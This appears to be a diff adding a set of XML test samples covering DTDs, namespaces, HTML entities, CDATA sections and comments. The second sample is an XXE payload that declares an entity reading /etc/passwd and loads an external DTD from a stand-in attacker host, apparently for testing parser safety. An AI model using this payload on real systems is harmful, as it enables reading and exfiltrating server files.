@@ -1,0 +1,75 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root (child*)>
+  <!ELEMENT child (#PCDATA)>
+  <!ATTLIST child id ID #REQUIRED>
+]>
+<root>
+  <child id="c1">Content with &lt;escaped&gt; characters</child>
+  <child id="c2">More content</child>
+</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE config [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<config>
+  <setting name="test">value</setting>
+</config>
+```
+
+```xml
+<?xml version="1.0"?>
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xmlns="http://example.com/default"
+      xmlns:custom="http://example.com/custom">
+  <element attr="value" custom:attr="custom_value">
+    <nested>
+      <deeply>
+        <nested>Text content</nested>
+      </deeply>
+    </nested>
+  </element>
+</root>
+```
+
+```xml
+<!DOCTYPE html [
+  <!ENTITY nbsp "&#160;">
+  <!ENTITY copy "&#169;">
+  <!ENTITY reg "&#174;">
+]>
+<html>
+  <head><title>Test&nbsp;Document</title></head>
+  <body>
+    <p>Copyright&copy; 2024&reg;</p>
+    <section id="sec1">
+      <h1>Section Title</h1>
+      <p>Paragraph with &#x0A; newline entity</p>
+    </section>
+  </body>
+</html>
+```
+
+```xml
+<?xml version="1.0"?>
+<data>
+  <record>
+    <![CDATA[
+      This section contains <unparsed> & "literal" content
+      with special chars: <tag>value</tag>
+    ]]>
+  </record>
+  <array>
+    <item index="0"/>
+    <item index="1"/>
+    <item index="2"/>
+  </array>
+  <comment><!-- This is a comment with special chars: & < > " ' --></comment>
+</data>
+```
